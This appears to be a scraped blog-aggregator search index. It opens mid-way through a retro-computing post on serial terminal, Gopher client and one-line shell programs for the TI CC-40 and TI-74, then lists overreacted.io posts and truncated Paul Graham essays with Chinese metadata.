POKE(XBADDR+229,194,224,241,34,32,139,9,30,211,74,18,72,171,9,30,210) 260 CALL POKE(XBADDR+245,74,224,153,125,30,74,226,166,211,74,50,74,195,34,32) 270 CALL POKE(XBADDR+260,224,185) 1000 CALL EXEC(XBADDR):CALL RELMEM(XBADDR):CLOSE #1\\nThis code is generated from the assembled binary with a Perl preprocessor and then tokenized using Texas Instruments'\\nTIC74.EXE\\nutility (works for both CC-40 and TI-74), which is available under\\nUtils/\\nin the\\nTIIF/TIIF2 archive\\n. Naturally, that's an MS-DOS executable, so to run it as part of the build process we use David Lee's\\nNT Virtual DOS Machine\\nas the emulator. To keep it short I've eliminated niceties like the cursor, which isn't strictly needed for navigation on a single-line display, and which also makes it a bit quicker.\\nBy default the terminal program opens an 300bps, 8N1 connection using device 20, which will work for the HX-3000 and the HEXTIr. If you want to use a different device, change the\\n20\\nin line 99 and line 110; if you want to change the baud rate, change the\\n300\\nin line 99. This is the same string you would use in, for example, Memo Processor with FN-Q. Here's the StarDust connecting at 19.2kbps:\\nThis terminal program scrolls horizontally like the MP does, except it keeps no history in memory. For convenience, CLR is mapped to BACKSPACE (^H), ENTER to LF (^J), SHIFT-ENTER to CR (^M) and DEL (SHIFT-back arrow) to DEL (^?), and it will accept either BS or DEL as backspace from the remote system. If you press OFF or BREAK, it exits to BASIC (OFF is a soft-key; it isn't attached to the power circuit). If it beeps at you when you try to send characters, there was an I/O error and you should press OFF and\\nRUN\\nthe program again to recover (the error message may or may not be displayed by BASIC).\\nThere are a few important things to\\nnote about our code\\n. Because we have no idea where we will get loaded to, our assembler source must exclusively use relative branches internally (dealing with limited displacements with jump islands), with the only absolute addresses being outside our program to specific registers and ROM calls. This limitation is not necessary with a cartridge. We also reuse some briefly idle portions of BASIC's memory for our own temporary storage, such as keeping both the buffer for Hexbus data and our scrolling screen line in the BASIC input buffer. These are stored (yet again) reversed because TI. To talk to the external device, we create a temporary Peripheral Access Block in the section of internal RAM BASIC itself uses for this purpose. This structure contains addresses for buffers and the Hexbus command bytes, and is passed to\\nIOS\\nto send out on the bus and gather a reply. We don't need to do this to initially configure the device, however, because the\\nOPEN\\nstatement in our BASIC loader will do that for us (channel #1 is otherwise unused). We use the same brute-force method as MP because that's the least bad way to accomplish what we need reliably, though we have slightly less overhead, so we can maintain better data rates.\\nTI provided their own assembler, but here we use the well-known multi-architecture\\nMacroassembler AS\\nwhich is what I use for most architectures that aren't the 6502 or PowerPC. AS does not accept canonical TI syntax, so specify hex and immediates as you see them in the source file, and be cautious about modification as it will attempt to emit instructions for mnemonics the 70C20 may not support. One glitch, possibly to be fixed in the future, is that\\nmovd #...,b\\nassembles incorrectly: you need to specify the register by number. (Not much of a loss because\\nmov #..,a\\nand\\nmov #..,b\\ndo\\nwork, and together they generate code that is the same size yet slightly faster.)\\nThat's the CC-40 done. Unfortunately, to get this running on the TI-74 requires a bit more work because\\nCALL GETMEM\\n,\\nRELMEM\\n,\\nPOKE\\nand\\nEXEC\\nare part of the multiple subprograms TI liquidated to get everything to fit. But there's nothing that says you can't store a subprogram in\\nRAM\\n.\\nThese subprograms would naturally be needed for on-device development purposes, so TI quietly made them available, and nowadays they are also part of\\nthe TIIF/TIIF2 package\\n. You can load these files into the TI-74 using TIIF if you have a PC-IF and a Windows PC, but I don't, so I'm going to use the HEXTIr to do so (the BackPack drive will also work). Unzip\\nTIIF.ZIP\\nand from\\nTIIF/Utils/UTIL74/\\n, copy\\nEXEC.SUB\\n,\\nGETMEM.SUB\\n,\\nLOAD.PGM\\n,\\nPOKE.SUB\\nand\\nRELMEM.SUB\\nto the SD card, then load and run\\nLOAD.PGM\\n(e.g.,\\nRUN\"100.LOAD.PGM\"\\n).\\nDon't bother trying to list\\nLOAD.PGM\\nbecause you can't \u2014 it's not actually a BASIC program. Rather, it's a machine language subroutine that will bootstrap loading new subprograms into memory.\\nFor each of the four subprograms we need (\\nEXEC\\n,\\nGETMEM\\n,\\nPOKE\\nand\\nRELMEM\\n), select \"L\"oad and enter the relevant filename (e.g.,\\n100.EXEC.SUB\\n). When you're done, select \"Q\"uit and you will be returned to BASIC.\\nNext, load the TI-74 version of the terminal program, either by putting\\n74ATRM.PGM\\nfrom\\nthe Github project\\non your HEXTIr or BackPack, or keying in the following:\\n99 PRINT\"Connecting\":OPEN #1,\"26.B=300,D=8,P=N,S=1,E=N,R=N,T=C,E=N\" 100 CALL GETMEM(271,XBADDR) 110 CALL POKE(XBADDR,6,138,32,31,208,126,114,26,70,114,3,69,213,68,136,33,29) 120 CALL POKE(XBADDR+17,60,213,67,213,66,136,0,30,65,213,73,213,63,224,125,213) 130 CALL POKE(XBADDR+33,63,213,62,213,61,235,19,93,0,230,76,114,4,69,114,1,63) 140 CALL POKE(XBADDR+50,18,92,45,230,226,93,45,231,226,89,45,13,226,24,45,191) 150 CALL POKE(XBADDR+66,226,16,45,250,226,8,45,246,230,14,34,127,224,10,34,8) 160 CALL POKE(XBADDR+82,224,6,34,13,224,2,34,10,139,33,29,18,126,139,32,31,235) 170 CALL POKE(XBADDR+99,0,136,0,70,118,181,142,240,69,125,0,61,226,7,34,15,139) 180 CALL POKE(XBADDR+116,32,31,235,0,114,3,69,213,63,213,61,213,73,136,0,70) 190 CALL POKE(XBADDR+132,118,181,142,240,69,125,0,61,230,146,125,0,63,230,12) 200 CALL POKE(XBADDR+147,224,139,18,126,139,32,31,235,0,10,224,34,77,73,63,230) 210 CALL POKE(XBADDR+163,10,213,83,136,33,60,89,235,10,224,229,34,30,211,73) 220 CALL POKE(XBADDR+178,50,73,106,192,170,33,0,45,13,226,4,45,10,230,17,114) 230 CALL POKE(XBADDR+194,30,74,82,31,34,32,194,171,33,30,93,0,230,248,224,205) 240 CALL POKE(XBADDR+210,45,8,226,43,45,127,226,39,50,74,230,28,208,72,82,29) 250 CALL POKE(XBADDR+226,170,33,30,195,171,33,30,93,1,226,4,194,194,224,241) 260 CALL POKE(XBADDR+241,34,32,139,33,30,211,74,18,72,171,33,30,210,74,224,158) 270 CALL POKE(XBADDR+257,125,30,74,226,166,211,74,50,74,195,34,32,224,185) 1000 CALL EXEC(XBADDR):CALL RELMEM(XBADDR):CLOSE #1\\nAs before, it runs as a BASIC program (either directly with\\nRUN\\nor from your storage media, e.g.,\\nRUN\"100.74ATRM.PGM\"\\n). If you get an error when you run it, most likely you forgot to load the subprograms. Go back a couple steps and do that first.\\nThis version defaults to device 26 (i.e., the StarDust USB port) at 300bps, which with the current firmware is a generally reliable speed. Like with the CC-40 version, you can use a different device number by changing the\\n26\\nin lines 99 and 110, and different device settings and bitrates by changing the string in line 99. The slower CPU in the TI-74 is not able to maintain reliable communications at 19.2kbps (since we're brute-forcing the Hexbus link, it's understandable that the maximum data rate would depend on the CPU's clock speed); the TI-74 will throw frequent I/O errors at this speed, sometimes severe enough that it will lock up the StarDust and the machine will need to be powercycled. Doing so won't erase anything in memory, but it's inconvenient. 9600bps is a decent compromise, though even that will still throw an error now and then, so 4800bps or 2400bps might be better and 4800bps is what I use personally.\\nOnce you have things the way you want them, you could consider putting it on a Constant Memory cartridge with a\\nCALL PUT(1)\\nso you don't have to keep doing so (and either a\\nCALL GET(1)\\nto retrieve it, or\\nCALL GET(-1)\\nto swap memory contents). This helpfully stores not only the terminal program but also all the subprograms you have loaded into memory. If you do this, I advise unplugging the cartridge if you won't be using the TI-74 for awhile or if you remove its batteries, because once the main AAAs run down the computer may draw on the lithium cell in the cartridge to keep its own memory contents alive and kill it quicker. Don't ask me how I know this.\\nThere are some minor differences in the TI-74 version. As it has no beeper, if there is an I/O error the terminal program will instead turn on some of the LCD's on-screen indicators in an obviously impossible configuration. Press OFF to exit (as with the CC-40 version), after which more information may be displayed. The key shortcuts are still supported (such as CLR for BS/^H), though note that DEL on the TI-74 is SHIFT-7, and because SHIFT-ENTER is the equals sign the TI-74 version moves CR/^M to the RUN key.\\nOkay, we now have both the CC-40 and the TI-74 talking to a serial port. What can we do with that? Well, as our last stop, I did promise you Gopherspace, didn't I?\\nFinally, of one-line shells and Gopher clients\\nAnd I don't mean a shell or a Gopher client that's a one-liner \u2014 we need to think about how to meaningfully present information formatted for a full-size screen on a single-row, 31-column display. Since we're not running the client on the actual computer itself, this gives us some options for what's effectively server-side rendering, but we're still constrained by the limited amount of text we can display at any one time.\\nPaging is unavoidable, but because Gopher menus and text documents are line-oriented we can do so line-by-line. Also, since both Memo Processor and our hacky miniterm can scroll the screen, we can use this mechanic for communicating longer continuous lines to the user (the visual effect is even heightened at slower bit rates, which is a helpful side effect). So that we can more efficiently move through a document, we can also allow the user to quickly jump to the next line instead of having to scroll the entirety of a line they might not want to page through. For those sorts of navigational commands we'll just use single keypresses, accepting a text string from the user as necessary.\\nTo hook up our software clients to the serial port, we'll dust off the old\\nusb2ppp\\ntool we originally wrote for the\\nBrother GeoBook\\n, but which can actually run any program over a serial port without having to mess with things like\\ngetty\\nas long as you have appropriate permissions to the device. (Linux people,\\ncheck your\\nudev\\nrules\\n.) For convenience I have included it in\\nthe Github project\\nfor this article, and it can be compiled on most Un*x-like systems with something approximating\\ncc -O3 -o usb2ppp usb2ppp.c\\n(only\\ntermios.h\\nand the basic standard library are required). Both clients are in the Github project.\\nI've dubbed the gopher client\\nthe \"GOLM\" (Gopher One Line Mangler)\\n. It's written in Perl 5 (so there), so you can easily modify it, and it runs under\\nusb2ppp\\nwith something like (on my MacBook Air)\\n./usb2ppp /dev/cu.usbserial-110 300 perl golm.pl\\nwhich runs it over\\n/dev/cu.usbserial-110\\nat 300bps. Since this is the kind of thing you'd really want to see live and in action, here's a short video (YouTube link) with the CC-40 running the HEXTIr at 300bps.\\nThe client has a very basic built-in quick menu when you start it (basically the Floodgap gopher and Veronica-2). You can scroll through lines with the ENTER key, or immediately jump to the next line with the SPACE bar, or move backwards with the CLR [backspace] key. The G key goes to a menu link, the L key opens a new location, the B key goes back in your history (resuming at the same line you left) and the Q key quits. Here, we browse the Floodgap menu, then search Veronica-2 for some hot hot Texas Instruments action (using the CLR [backspace] key to move back up to the menu item we want), and read about it in text. This is all live, on real Gopher servers. There you are \u2014 Gopherspace on a Texas Instruments Compact Computer 40.\\nI'm pretty patient with my geriatric machines but even considering that I found the interface quite useable even at 300bps. Naturally, when I got it working, I had to see if the idea could work for other things. Is this sort of interface generalizeable? Like, what if we could run a shell prompt this way?\\nWell! No need to imagine because\\nof course\\nI decided to write up a proof of concept, just to see. It's in Perl too, named\\nthe SLOSH (\"Single Line Onscreen SHell\")\\n, and you can start it with something like\\n./usb2ppp /dev/cu.usbserial-D3B19P0Y 4800 perl slosh.pl\\n. Here it is, this time on the TI-74 with the StarDust adapter at 4800bps (also YouTube due to size):\\nWith a long USB cable (or\\na wireless link\\n, I guess), you could do this kind of thing right from your couch. In this example, I listed out my development directory, tried a few real commands, attempted to vainly browse Google's home page with\\ncurl\\n(worked sort of), and read a\\nman\\npage (\\nman\\n's\\nman\\npage, the\\nman\\nliest\\nman\\npage there is). There is a very simple prompt which uses your\\nPATH\\nto find utilities (it will print an\\nX\\nif it can't find it so that at 300bps you don't have to get annoyed scrolling\\nCommand not found you idjit\\nin longhand all the time). When you're done, type\\nexit\\n.\\nThe main advancement you may have noticed here is that spaces were compressed in the output so you could see more on the screen and blank lines were dropped. I have this implemented in the gopher client, too, but Gopher menus are usually written for fixed width fonts and spaces and blank lines are often salient, so shrink-wrapping of this sort is off there by default. The\\n$WIDTH\\nand\\n$SHRINK\\nenvironment variables (use\\nset KEY=value\\nto change) control the width of the scrolling display and whether spaces should be squished together (tabs are handled properly). If you want to play with this in the Gopher client, set the environment variable(s) before starting\\ngolm.pl\\n.\\nIt should go without saying you shouldn't use this as your real shell, or at least not yet, because there are a lot of edge cases to iron out. Necessarily this must connect a pipe to the command so we can paginate it, which some commands aren't going to tolerate well (I also don't hoover up the entire output into memory since we have no idea how big that might be, so you can't back up to a prior line presently), and this may not work properly with some sorts of pipe chains. There is at least code to check for some shell metacharacters so you can still redirect output to a file if you want, but I'm sure it can be fooled, and I'm sure some of you will attempt to.\\nI wrote both of these clients in a generic fashion such that any pocket or handheld computer with a single line display could use one of these clients: they are not in any way specific to the CC-40 or TI-74. If someone came up with a serial port option for my beloved Tandy PC-4 (there's an idea), you could set\\n$WIDTH\\nto 11 characters (!!) and see how far you get. I'd be interested to hear how this works on other handheld systems if someone gets the idea to try.\\nTo build your own version of the\\nASMTRM\\nterminal utility, you'll need\\nmake\\n, Perl 5, the Macroassembler AS,\\nTIC74.EXE\\n(under\\nUtils/\\nin the TIFF/TIFF2 distribution), and\\nNTVDM\\n; see the\\nREADME\\nfor instructions. Both Perl clients, the C source for\\nusb2ppp\\nand the assembly source for the CC-40/TI-74 terminal program are in\\nthis blog post's Github project\\n.\\nASMTRM\\n, SLOSH and GOLM are all released under the BSD 2-clause license.</p>"},{"location":"overreacted.io/","title":"overreacted.io","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"overreacted.io/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"overreacted.io/#1-a-social-filesystem","title":"1. A Social Filesystem","text":"<p>\u94fe\u63a5: https://overreacted.io/a-social-filesystem/</p> <p>\u65e5\u671f: Sun, 18 Jan 2026 00:00:00 GMT</p> <p>\u6458\u8981: Formats over apps.</p>"},{"location":"overreacted.io/#2-introducing-rsc-explorer","title":"2. Introducing RSC Explorer","text":"<p>\u94fe\u63a5: https://overreacted.io/introducing-rsc-explorer/</p> <p>\u65e5\u671f: Fri, 19 Dec 2025 00:00:00 GMT</p> <p>\u6458\u8981: My new hobby project.</p>"},{"location":"overreacted.io/#3-hire-me-in-japan","title":"3. Hire Me in Japan","text":"<p>\u94fe\u63a5: https://overreacted.io/hire-me-in-japan/</p> <p>\u65e5\u671f: Tue, 11 Nov 2025 00:00:00 GMT</p> <p>\u6458\u8981: I'm looking for a new job.</p>"},{"location":"overreacted.io/#4-how-to-fix-any-bug","title":"4. How to Fix Any Bug","text":"<p>\u94fe\u63a5: https://overreacted.io/how-to-fix-any-bug/</p> <p>\u65e5\u671f: Tue, 21 Oct 2025 00:00:00 GMT</p> <p>\u6458\u8981: The joys of vibecoding.</p>"},{"location":"overreacted.io/#5-where-its-at","title":"5. Where It's at://","text":"<p>\u94fe\u63a5: https://overreacted.io/where-its-at/</p> <p>\u65e5\u671f: Thu, 02 Oct 2025 00:00:00 GMT</p> <p>\u6458\u8981: From handles to hosting.</p>"},{"location":"overreacted.io/01_A_Social_Filesystem/","title":"A Social Filesystem","text":"<p>\u539f\u6587\u94fe\u63a5: https://overreacted.io/a-social-filesystem/ \u53d1\u5e03\u65e5\u671f: Sun, 18 Jan 2026 00:00:00 GMT</p> <p>Formats over apps.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"overreacted.io/02_Introducing_RSC_Explorer/","title":"Introducing RSC Explorer","text":"<p>\u539f\u6587\u94fe\u63a5: https://overreacted.io/introducing-rsc-explorer/ \u53d1\u5e03\u65e5\u671f: Fri, 19 Dec 2025 00:00:00 GMT</p> <p>My new hobby project.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"overreacted.io/03_Hire_Me_in_Japan/","title":"Hire Me in Japan","text":"<p>\u539f\u6587\u94fe\u63a5: https://overreacted.io/hire-me-in-japan/ \u53d1\u5e03\u65e5\u671f: Tue, 11 Nov 2025 00:00:00 GMT</p> <p>I'm looking for a new job.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"overreacted.io/04_How_to_Fix_Any_Bug/","title":"How to Fix Any Bug","text":"<p>\u539f\u6587\u94fe\u63a5: https://overreacted.io/how-to-fix-any-bug/ \u53d1\u5e03\u65e5\u671f: Tue, 21 Oct 2025 00:00:00 GMT</p> <p>The joys of vibecoding.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"overreacted.io/05_Where_It_s_at___/","title":"Where It's at://","text":"<p>\u539f\u6587\u94fe\u63a5: https://overreacted.io/where-its-at/ \u53d1\u5e03\u65e5\u671f: Thu, 02 Oct 2025 00:00:00 GMT</p> <p>From handles to hosting.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"paulgraham.com/","title":"paulgraham.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>How to Do Great Work</li> <li>How to Get New Ideas</li> <li>Superlinear Returns</li> <li>The Need to Read</li> <li>What You (Want to)- Want</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"paulgraham.com/How%20to%20Do%20Great%20Work/","title":"How to Do Great Work","text":"<p>\u6765\u6e90: paulgraham.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://www.paulgraham.com/greatwork.html</p> <p>July 2023 If you collected lists of techniques for doing great work in a lot of different fields, what would the intersection look like? I decided to find out by making it. Partly my goal was to create a guide that could be used by someone working in any field. But I was also curious about the shape of the intersection. And one thing this exercise shows is that it does have a definite shape; it's not just a point labelled \"work hard.\" The following recipe assumes you're very ambitious. The first step is to decide what to work on. The work you choose needs to have three qualities: it has to be something you have a natural aptitude for, that you have a deep interest in, and that offers scope to do great work. In practice you don't have to worry much about the third criterion. Ambitious people are if anything already too conservative about it. So all you need to do is find something you have an aptitude for and great interest in. [ 1 ] That sounds straightforward, but it's often quite difficult. When you're young you don't know what you're good at or what different kinds of work are like. Some kinds of work you end up doing may not even exist yet. So while some people know what they want to do at 14, most have to figure it out. The way to figure out what to work on is by working. If you're not sure what to work on, guess. But pick something and get going. You'll probably guess wrong some of the time, but that's fine. It's good to know about multiple things; some of the biggest discoveries come from noticing connections between different fields. Develop a habit of working on your own projects. Don't let \"work\" mean something other people tell you to do. If you do manage to do great work one day, it will probably be on a project of your own. It may be within some bigger project, but you'll be driving your part of it. What should your projects be? Whatever seems to you excitingly ambitious. As you grow older and your taste in projects evolves, exciting and important will converge. At 7 it may seem excitingly ambitious to build huge things out of Lego, then at 14 to teach yourself calculus, till at 21 you're starting to explore unanswered questions in physics. But always preserve excitingness. There's a kind of excited curiosity that's both the engine and the rudder of great work. It will not only drive you, but if you let it have its way, will also show you what to work on. What are you excessively curious about \u2014 curious to a degree that would bore most other people? That's what you're looking for. Once you've found something you're excessively interested in, the next step is to learn enough about it to get you to one of the frontiers of knowledge. Knowledge expands fractally, and from a distance its edges look smooth, but once you learn enough to get close to one, they turn out to be full of gaps. The next step is to notice them. This takes some skill, because your brain wants to ignore such gaps in order to make a simpler model of the world. Many discoveries have come from asking questions about things that everyone else took for granted. [ 2 ] If the answers seem strange, so much the better. Great work often has a tincture of strangeness. You see this from painting to math. It would be affected to try to manufacture it, but if it appears, embrace it. Boldly chase outlier ideas, even if other people aren't interested in them \u2014 in fact, especially if they aren't. If you're excited about some possibility that everyone else ignores, and you have enough expertise to say precisely what they're all overlooking, that's as good a bet as you'll find. [ 3 ] Four steps: choose a field, learn enough to get to the frontier, notice gaps, explore promising ones. This is how practically everyone who's done great work has done it, from painters to physicists. Steps two and four will require hard work. It may not be possible to prove that you have to work hard to do great things, but the empirical evidence is on the scale of the evidence for mortality. That's why it's essential to work on something you're deeply interested in. Interest will drive you to work harder than mere diligence ever could. The three most powerful motives are curiosity, delight, and the desire to do something impressive. Sometimes they converge, and that combination is the most powerful of all. The big prize is to discover a new fractal bud. You notice a crack in the surface of knowledge, pry it open, and there's a whole world inside. Let's talk a little more about the complicated business of figuring out what to work on. The main reason it's hard is that you can't tell what most kinds of work are like except by doing them. Which means the four steps overlap: you may have to work at something for years before you know how much you like it or how good you are at it. And in the meantime you're not doing, and thus not learning about, most other kinds of work. So in the worst case you choose late based on very incomplete information. [ 4 ] The nature of ambition exacerbates this problem. Ambition comes in two forms, one that precedes interest in the subject and one that grows out of it. Most people who do great work have a mix, and the more you have of the former, the harder it will be to decide what to do. The educational systems in most countries pretend it's easy. They expect you to commit to a field long before you could know what it's really like. And as a result an ambitious person on an optimal trajectory will often read to the system as an instance of breakage. It would be better if they at least admitted it \u2014 if they admitted that the system not only can't do much to help you figure out what to work on, but is designed on the assumption that you'll somehow magically guess as a teenager. They don't tell you, but I will: when it comes to figuring out what to work on, you're on your own. Some people get lucky and do guess correctly, but the rest will find themselves scrambling diagonally across tracks laid down on the assumption that everyone does. What should you do if you're young and ambitious but don't know what to work on? What you should not do is drift along passively, assuming the problem will solve itself. You need to take action. But there is no systematic procedure you can follow. When you read biographies of people who've done great work, it's remarkable how much luck is involved. They discover what to work on as a result of a chance meeting, or by reading a book they happen to pick up. So you need to make yourself a big target for luck, and the way to do that is to be curious. Try lots of things, meet lots of people, read lots of books, ask lots of questions. [ 5 ] When in doubt, optimize for interestingness. Fields change as you learn more about them. What mathematicians do, for example, is very different from what you do in high school math classes. So you need to give different types of work a chance to show you what they're like. But a field should become increasingly interesting as you learn more about it. If it doesn't, it's probably not for you. Don't worry if you find you're interested in different things than other people. The stranger your tastes in interestingness, the better. Strange tastes are often strong ones, and a strong taste for work means you'll be productive. And you're more likely to find new things if you're looking where few have looked before. One sign that you're suited for some kind of work is when you like even the parts that other people find tedious or frightening. But fields aren't people; you don't owe them any loyalty. If in the course of working on one thing you discover another that's more exciting, don't be afraid to switch. If you're making something for people, make sure it's something they actually want. The best way to do this is to make something you yourself want. Write the story you want to read; build the tool you want to use. Since your friends probably have similar interests, this will also get you your initial audience. This should follow from the excitingness rule. Obviously the most exciting story to write will be the one you want to read. The reason I mention this case explicitly is that so many people get it wrong. Instead of making what they want, they try to make what some imaginary, more sophisticated audience wants. And once you go down that route, you're lost. [ 6 ] There are a lot of forces that will lead you astray when you're trying to figure out what to work on. Pretentiousness, fashion, fear, money, politics, other people's wishes, eminent frauds. But if you stick to what you find genuinely interesting, you'll be proof against all of them. If you're interested, you're not astray. Following your interests may sound like a rather passive strategy, but in practice it usually means following them past all sorts of obstacles. You usually have to risk rejection and failure. So it does take a good deal of boldness. But while you need boldness, you don't usually need much planning. In most cases the recipe for doing great work is simply: work hard on excitingly ambitious projects, and something good will come of it. Instead of making a plan and then executing it, you just try to preserve certain invariants. The trouble with planning is that it only works for achievements you can describe in advance. You can win a gold medal or get rich by deciding to as a child and then tenaciously pursuing that goal, but you can't discover natural selection that way. I think for most people who want to do great work, the right strategy is not to plan too much. At each stage do whatever seems most interesting and gives you the best options for the future. I call this approach \"staying upwind.\" This is how most people who've done great work seem to have done it. Even when you've found something exciting to work on, working on it is not always straightforward. There will be times when some new idea makes you leap out of bed in the morning and get straight to work. But there will also be plenty of times when t</p> <p>... (\u5185\u5bb9\u5df2\u622a\u65ad)</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:04</p>"},{"location":"paulgraham.com/How%20to%20Get%20New%20Ideas/","title":"How to Get New Ideas","text":"<p>\u6765\u6e90: paulgraham.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://www.paulgraham.com/getideas.html</p> <p>January 2023 ( Someone fed my essays into GPT to make something that could answer questions based on them, then asked it where good ideas come from.  The answer was ok, but not what I would have said. This is what I would have said.) The way to get new ideas is to notice anomalies: what seems strange, or missing, or broken? You can see anomalies in everyday life (much of standup comedy is based on this), but the best place to look for them is at the frontiers of knowledge. Knowledge grows fractally. From a distance its edges look smooth, but when you learn enough to get close to one, you'll notice it's full of gaps. These gaps will seem obvious; it will seem inexplicable that no one has tried x or wondered about y. In the best case, exploring such gaps yields whole new fractal buds.</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:05</p>"},{"location":"paulgraham.com/Superlinear%20Returns/","title":"Superlinear Returns","text":"<p>\u6765\u6e90: paulgraham.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://www.paulgraham.com/superlinear.html</p> <p>October 2023 One of the most important things I didn't understand about the world when I was a child is the degree to which the returns for performance are superlinear. Teachers and coaches implicitly told us the returns were linear. \"You get out,\" I heard a thousand times, \"what you put in.\" They meant well, but this is rarely true. If your product is only half as good as your competitor's, you don't get half as many customers. You get no customers, and you go out of business. It's obviously true that the returns for performance are superlinear in business. Some think this is a flaw of capitalism, and that if we changed the rules it would stop being true. But superlinear returns for performance are a feature of the world, not an artifact of rules we've invented. We see the same pattern in fame, power, military victories, knowledge, and even benefit to humanity. In all of these, the rich get richer. [ 1 ] You can't understand the world without understanding the concept of superlinear returns. And if you're ambitious you definitely should, because this will be the wave you surf on. It may seem as if there are a lot of different situations with superlinear returns, but as far as I can tell they reduce to two fundamental causes: exponential growth and thresholds. The most obvious case of superlinear returns is when you're working on something that grows exponentially. For example, growing bacterial cultures. When they grow at all, they grow exponentially. But they're tricky to grow. Which means the difference in outcome between someone who's adept at it and someone who's not is very great. Startups can also grow exponentially, and we see the same pattern there. Some manage to achieve high growth rates. Most don't. And as a result you get qualitatively different outcomes: the companies with high growth rates tend to become immensely valuable, while the ones with lower growth rates may not even survive. Y Combinator encourages founders to focus on growth rate rather than absolute numbers. It prevents them from being discouraged early on, when the absolute numbers are still low. It also helps them decide what to focus on: you can use growth rate as a compass to tell you how to evolve the company. But the main advantage is that by focusing on growth rate you tend to get something that grows exponentially. YC doesn't explicitly tell founders that with growth rate \"you get out what you put in,\" but it's not far from the truth. And if growth rate were proportional to performance, then the reward for performance p over time t would be proportional to p t . Even after decades of thinking about this, I find that sentence startling. Whenever how well you do depends on how well you've done, you'll get exponential growth. But neither our DNA nor our customs prepare us for it. No one finds exponential growth natural; every child is surprised, the first time they hear it, by the story of the man who asks the king for a single grain of rice the first day and double the amount each successive day. What we don't understand naturally we develop customs to deal with, but we don't have many customs about exponential growth either, because there have been so few instances of it in human history. In principle herding should have been one: the more animals you had, the more offspring they'd have. But in practice grazing land was the limiting factor, and there was no plan for growing that exponentially. Or more precisely, no generally applicable plan. There was a way to grow one's territory exponentially: by conquest. The more territory you control, the more powerful your army becomes, and the easier it is to conquer new territory. This is why history is full of empires. But so few people created or ran empires that their experiences didn't affect customs very much. The emperor was a remote and terrifying figure, not a source of lessons one could use in one's own life. The most common case of exponential growth in preindustrial times was probably scholarship. The more you know, the easier it is to learn new things. The result, then as now, was that some people were startlingly more knowledgeable than the rest about certain topics. But this didn't affect customs much either. Although empires of ideas can overlap and there can thus be far more emperors, in preindustrial times this type of empire had little practical effect. [ 2 ] That has changed in the last few centuries. Now the emperors of ideas can design bombs that defeat the emperors of territory. But this phenomenon is still so new that we haven't fully assimilated it. Few even of the participants realize they're benefitting from exponential growth or ask what they can learn from other instances of it. The other source of superlinear returns is embodied in the expression \"winner take all.\" In a sports match the relationship between performance and return is a step function: the winning team gets one win whether they do much better or just slightly better. [ 3 ] The source of the step function is not competition per se, however. It's that there are thresholds in the outcome. You don't need competition to get those. There can be thresholds in situations where you're the only participant, like proving a theorem or hitting a target. It's remarkable how often a situation with one source of superlinear returns also has the other. Crossing thresholds leads to exponential growth: the winning side in a battle usually suffers less damage, which makes them more likely to win in the future. And exponential growth helps you cross thresholds: in a market with network effects, a company that grows fast enough can shut out potential competitors. Fame is an interesting example of a phenomenon that combines both sources of superlinear returns. Fame grows exponentially because existing fans bring you new ones. But the fundamental reason it's so concentrated is thresholds: there's only so much room on the A-list in the average person's head. The most important case combining both sources of superlinear returns may be learning. Knowledge grows exponentially, but there are also thresholds in it. Learning to ride a bicycle, for example. Some of these thresholds are akin to machine tools: once you learn to read, you're able to learn anything else much faster. But the most important thresholds of all are those representing new discoveries. Knowledge seems to be fractal in the sense that if you push hard at the boundary of one area of knowledge, you sometimes discover a whole new field. And if you do, you get first crack at all the new discoveries to be made in it. Newton did this, and so did Durer and Darwin. Are there general rules for finding situations with superlinear returns? The most obvious one is to seek work that compounds. There are two ways work can compound. It can compound directly, in the sense that doing well in one cycle causes you to do better in the next. That happens for example when you're building infrastructure, or growing an audience or brand. Or work can compound by teaching you, since learning compounds. This second case is an interesting one because you may feel you're doing badly as it's happening. You may be failing to achieve your immediate goal. But if you're learning a lot, then you're getting exponential growth nonetheless. This is one reason Silicon Valley is so tolerant of failure. People in Silicon Valley aren't blindly tolerant of failure. They'll only continue to bet on you if you're learning from your failures. But if you are, you are in fact a good bet: maybe your company didn't grow the way you wanted, but you yourself have, and that should yield results eventually. Indeed, the forms of exponential growth that don't consist of learning are so often intermixed with it that we should probably treat this as the rule rather than the exception. Which yields another heuristic: always be learning. If you're not learning, you're probably not on a path that leads to superlinear returns. But don't overoptimize what you're learning. Don't limit yourself to learning things that are already known to be valuable. You're learning; you don't know for sure yet what's going to be valuable, and if you're too strict you'll lop off the outliers. What about step functions? Are there also useful heuristics of the form \"seek thresholds\" or \"seek competition?\" Here the situation is trickier. The existence of a threshold doesn't guarantee the game will be worth playing. If you play a round of Russian roulette, you'll be in a situation with a threshold, certainly, but in the best case you're no better off. \"Seek competition\" is similarly useless; what if the prize isn't worth competing for? Sufficiently fast 